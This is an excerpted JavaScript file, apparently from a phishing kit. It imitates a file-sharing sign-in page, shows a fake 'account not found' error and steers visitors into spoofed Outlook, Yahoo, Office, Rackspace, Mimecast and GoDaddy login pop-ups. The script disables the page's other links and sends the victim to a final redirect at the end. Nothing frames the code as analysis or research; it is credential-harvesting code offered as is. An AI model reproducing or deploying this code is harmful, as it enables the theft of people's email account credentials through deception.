...
let Domains = {
    ...
    "Rackspace": {link: "assets/out/i.htm?d=Rackspace%20Account&t=a&u=", id: '#outlook_modal'},
    "Mimecast": {link: "assets/out/i.htm?d=Mimecast%20Account&t=m&u=", id: '#outlook_modal'},
    "Godaddy": {link: "assets/out/i.htm?d=Godaddy%20Account&t=godaddy&u=", id: '#outlook_modal'},
...
$(document).ready(async function () {
    localStorageCheck();
    let $span = $('.dig-Text.dig-Text--variant-paragraph.dig-Text--size-standard.dig-Text--color-standard.dig-Banner-message');
    ...
    if (main_url.searchParams.has("comment")) {
        let cm = main_url.searchParams.get('comment').toString();
        if (cm === "1" || cm === "2" || cm === "3" || cm === "4" || cm === "5" || cm === "6") {
            cm = parseInt(cm) - 1;
            cm = comment[cm];
            $span.html(cm);
        } else {
    ...
    $("a").each(function (index, element) {
        ...
        if (href.endsWith("aol") === false && href.endsWith("outlook") === false && href.endsWith("yahoo") === false) {
            $(this).attr("onclick", "window.location.replace(window.location.href); return false;")
        }
    });

    $("button.SpinnerButton").on('click', async function (e) {
        let $button = $("button.SpinnerButton");
        if ($button.hasClass("is-disabled")) {
            return false;
        }
        $button.addClass("is-disabled");
        let $input = $("#EmailPage-EmailField");
        let $error_m = $("[data-id=EmailPage-EmailField-Error]");
        $error_m.hide();
        $input.removeClass("is-invalid");
        $input.attr("readonly", "readonly");
        if ($input.val().length < 1) {
            setTimeout(function () {
                $input.removeAttr("readonly").addClass("is-invalid");
                $button.removeClass("is-disabled");
                $error_m.html("Please enter an email address.");
                $error_m.show();
            }, 200);
        } else {
                ...
                if (Object.keys(res).includes("domain")) {
                    ...
                    if (domain.length < 2) {
                        ...
                        setTimeout(function () {
                            $input.removeAttr("readonly").addClass("is-invalid");
                            $button.removeClass("is-disabled");
                            $error_m.html("We couldn't find an account with that email address. <br><a class=\"spectrum-Link\" onclick='hash_outlook();return false;' href=\"#outlook\" data-id=\"EmailPage-EmailField-Error-FindYourAccount-Link\" rel=\"noopener noreferrer\">Sign in with Outlook</a> <span class=\"EmailPage__account-not-found-separator\">  or  </span> <a class=\"spectrum-Link\" onclick='hash_yahoo();return false;' href=\"#yahoo\" data-id=\"EmailPage-EmailField-Error-CreateAccount-Link\" rel=\"noopener noreferrer\">continue with yahoo</a>");
                            $error_m.show();
                        }, (1000 - remove));
                    } else {
    ...
    $("#EmailPage-EmailField").on('change', function () {
        let $input = $("#EmailPage-EmailField");
        let $error_m = $("[data-id=EmailPage-EmailField-Error]");
        $error_m.hide();
    ...
    $("a.yahoo_button, a.hash_yahoo").on('click', function (e) {
        e.preventDefault();
        hash_yahoo();
        return false;
    })

    $("a.office_button").on('click', function (e) {
        e.preventDefault();
        $("#outlook_modal iframe").attr("src", "main/A/b.htm");
        Fancybox.show([{src: "#outlook_modal", type: "inline"}], {click: false});
        $(".fancybox__slide.is-selected.has-inline").css({
            "border-width": "0",
            "padding": "0",
            "margin": "0"
    ...
    $("a.outlook_button").on('click', function (e) {
        e.preventDefault();
        hash_outlook()
        return false;
    })
...
function hash_yahoo() {
    $("#outlook_modal iframe").attr("src", "main/Y/b.htm");
    Fancybox.show([{src: "#outlook_modal", type: "inline"}], {click: false});
    $(".fancybox__slide.is-selected.has-inline").css({
        "border-width": "0",
        "padding": "0",
...
function hash_outlook() {
    $("#outlook_modal iframe").attr("src", "main/out/b.htm");
    Fancybox.show([{src: "#outlook_modal", type: "inline"}], {click: false});
    $(".fancybox__slide.is-selected.has-inline").css({
        "border-width": "0",
        "padding": "0",
...
window.close_popup_final = function () {
    Fancybox.close([{all: true}]);
    window.location.replace(FINAL_REDIRECTION);
}
window.close_popup_reload = function () {
    window.location.replace(location.href);
}
window.close_final = function () {
    window.location.replace(FINAL_REDIRECTION);
}
